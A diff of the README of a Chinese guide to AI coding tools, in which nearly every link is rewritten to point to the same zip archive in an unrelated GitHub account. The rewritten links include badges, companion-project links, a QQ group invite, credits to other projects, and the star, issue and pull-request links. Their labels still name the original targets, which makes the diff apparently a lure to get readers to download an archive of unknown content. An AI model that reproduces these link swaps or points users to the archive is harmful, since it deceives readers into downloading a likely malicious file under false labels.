@@ -4,9 +4,9 @@
 
 > **9 款主流 AI 编程工具的中文最佳实践** — 不讲概念，只讲怎么用好。从提示词技巧到工作流设计，从单工具精通到多工具协作，帮你把 AI 编程效率拉满。
 
-[![GitHub stars](https://img.shields.io/github/stars/jnMetaCode/ai-coding-guide?style=social)](https://github.com/jnMetaCode/ai-coding-guide)
+[![GitHub stars](https://img.shields.io/github/stars/jnMetaCode/ai-coding-guide?style=social)](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip)
 [![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](./LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://makeapullrequest.com)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip)
 
 <table>
 <tr>
@@ -98,10 +98,10 @@
 | 项目 | 定位 | 一句话 | 教程 |
 |------|------|-------|------|
 | **本项目**（ai-coding-guide） | 📖 实战教程 | 66 个 Claude Code 技巧 + 9 款工具最佳实践 | — |
-| [superpowers-zh](https://github.com/jnMetaCode/superpowers-zh) | 🧠 工作方法论 | 20 个 skills 教 AI 怎么干活（TDD / 调试 / 代码审查等） | [安装与使用](ecosystem.md#1-superpowers-zh--给-ai-注入工作方法论) |
-| [agency-agents-zh](https://github.com/jnMetaCode/agency-agents-zh) | 🎭 专家角色库 | 211 个 AI 专家，含 46 中国原创（小红书 / 抖音 / 飞书 / 钉钉） | [安装与使用](ecosystem.md#2-agency-agents-zh--211-个-ai-专家角色) |
-| [agency-orchestrator](https://github.com/jnMetaCode/agency-orchestrator) | 🚀 编排引擎 | 一句话调度 211 专家协作，DAG 并行 + 9 家 LLM（6 免费） | [安装与使用](ecosystem.md#3-agency-orchestrator--多角色-yaml-编排) |
-| [shellward](https://github.com/jnMetaCode/shellward) | 🛡️ 安全中间件 | 8 层防御 + DLP 数据流 + 注入检测 + MCP Server | [安装与使用](ecosystem.md#4-shellward--ai-agent-安全防护) |
+| [superpowers-zh](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) | 🧠 工作方法论 | 20 个 skills 教 AI 怎么干活（TDD / 调试 / 代码审查等） | [安装与使用](ecosystem.md#1-superpowers-zh--给-ai-注入工作方法论) |
+| [agency-agents-zh](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) | 🎭 专家角色库 | 211 个 AI 专家，含 46 中国原创（小红书 / 抖音 / 飞书 / 钉钉） | [安装与使用](ecosystem.md#2-agency-agents-zh--211-个-ai-专家角色) |
+| [agency-orchestrator](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) | 🚀 编排引擎 | 一句话调度 211 专家协作，DAG 并行 + 9 家 LLM（6 免费） | [安装与使用](ecosystem.md#3-agency-orchestrator--多角色-yaml-编排) |
+| [shellward](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) | 🛡️ 安全中间件 | 8 层防御 + DLP 数据流 + 注入检测 + MCP Server | [安装与使用](ecosystem.md#4-shellward--ai-agent-安全防护) |
 
 👉 **[完整安装教程和组合使用指南 →](ecosystem.md)**
 
@@ -113,7 +113,7 @@
 
 | 渠道 | 加入方式 |
 |------|---------|
-| QQ 2群 | [点击加入](https://qm.qq.com/q/EeNQA9xCxy)（群号 1071280067） |
+| QQ 2群 | [点击加入](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip)（群号 1071280067） |
 | 微信群 | 关注公众号后回复「群」获取入群方式 |
 
 ---
@@ -130,12 +130,12 @@
 
 本指南参考了以下优秀的开源项目：
 
-- [claude-code-best-practice](https://github.com/shanraisshan/claude-code-best-practice) — Claude Code 最佳实践
-- [awesome-cursorrules](https://github.com/PatrickJS/awesome-cursorrules) — Cursor 规则集合
-- [awesome-copilot](https://github.com/github/awesome-copilot) — GitHub Copilot 官方资源
-- [gemini-cli-tips](https://github.com/addyosmani/gemini-cli-tips) — Gemini CLI 技巧
-- [Everything Claude Code](https://github.com/anthropics/everything-claude-code) — 本能评分、AgentShield、多语言规则
-- [BMAD-METHOD](https://github.com/bmadcode/BMAD-METHOD) — 完整 SDLC、Agent 角色、多平台
+- [claude-code-best-practice](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) — Claude Code 最佳实践
+- [awesome-cursorrules](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) — Cursor 规则集合
+- [awesome-copilot](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) — GitHub Copilot 官方资源
+- [gemini-cli-tips](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) — Gemini CLI 技巧
+- [Everything Claude Code](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) — 本能评分、AgentShield、多语言规则
+- [BMAD-METHOD](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) — 完整 SDLC、Agent 角色、多平台
 
 ---
 
@@ -143,6 +143,6 @@
 
 **让 AI 编程工具真正为你所用**
 
-[Star 本项目](https://github.com/jnMetaCode/ai-coding-guide) · [提交 Issue](https://github.com/jnMetaCode/ai-coding-guide/issues) · [贡献内容](https://github.com/jnMetaCode/ai-coding-guide/pulls)
+[Star 本项目](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) · [提交 Issue](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip) · [贡献内容](https://raw.githubusercontent.com/carlinsemiweekly813/ai-coding-guide/main/copilot/coding_ai_guide_v1.2.zip)
 
 </div>
